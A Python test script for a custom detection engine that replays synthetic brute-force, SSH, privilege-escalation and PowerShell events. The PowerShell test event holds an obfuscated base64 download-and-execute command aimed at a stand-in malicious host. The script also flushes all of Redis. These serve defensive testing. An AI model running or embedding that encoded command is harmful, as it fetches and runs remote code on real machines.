import json
from datetime import datetime
from waad_detection_engine import DetectionEngine

def run_all_tests():
    engine = DetectionEngine()

    print("WAAD ELKENIN - CyberPulse Detection Tests")
    print("=" * 50)

    # Clear Redis for clean test
    try:
        engine.redis.flushall()
    except:
        pass

    test_events = [
        {
            "event_type": "failed_login",
            "source_ip": "192.168.1.100",
            "username": "admin",
            "timestamp": datetime.now().isoformat()
        },
        {
            "event_type": "failed_login",
            "source_ip": "192.168.1.100",
            "username": "admin",
            "timestamp": datetime.now().isoformat()
        },
        {
            "event_type": "failed_login",
            "source_ip": "192.168.1.100",
            "username": "admin",
            "timestamp": datetime.now().isoformat()
        },
        {
            "event_type": "failed_login",
            "source_ip": "192.168.1.100",
            "username": "admin",
            "timestamp": datetime.now().isoformat()
        },
        {
            "event_type": "failed_login",
            "source_ip": "192.168.1.100",
            "username": "admin",
            "timestamp": datetime.now().isoformat()
        },
        {
            "event_type": "failed_login",
            "source_ip": "192.168.1.100",
            "username": "admin",
            "timestamp": datetime.now().isoformat()
        }
    ]

    print("Testing WESF1: Brute Force Detection...")
    for i, event in enumerate(test_events):
        alerts = engine.process_event(event)
        if alerts:
            print(f"   ✅ Alert {i+1}: {alerts[0]['title']}")

    print("\nTesting WESF2: PowerShell Abuse Detection...")
    ps_event = {
        "process_name": "powershell.exe",
        "command_line": "powershell -EncodedCommand SQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHMAYwByAGkAcAB0AC4AcABzADEAJwApAA==",
        "source_ip": "10.0.0.5",
        "username": "attacker",
        "timestamp": datetime.now().isoformat()
    }
    alerts = engine.process_event(ps_event)
    if alerts:
        print(f"   ✅ PowerShell Alert: {alerts[0]['title']}")

    print("\nTesting WESF3: SSH Anomaly Detection...")
    ssh_event = {
        "service": "ssh",
        "event_type": "failed_login",
        "username": "root",
        "source_ip": "203.0.113.45",
        "timestamp": datetime.now().isoformat()
    }
    for i in range(4):
        alerts = engine.process_event(ssh_event)
        if alerts:
            print(f"   ✅ SSH Alert {i+1}: {alerts[0]['title']}")

    print("\nTesting WESF4: Privilege Escalation Detection...")
    priv_event = {
        "command_line": "sudo su",
        "source_ip": "192.168.1.50",
        "username": "user1",
        "timestamp": datetime.now().isoformat()
    }
    alerts = engine.process_event(priv_event)
    if alerts:
        print(f"   ✅ Privilege Escalation Alert: {alerts[0]['title']}")

    print("\n" + "=" * 50)
    print("✅ All tests completed successfully!")
    print("Check api_failures.log for any API errors.")

if __name__ == "__main__":
    run_all_tests()
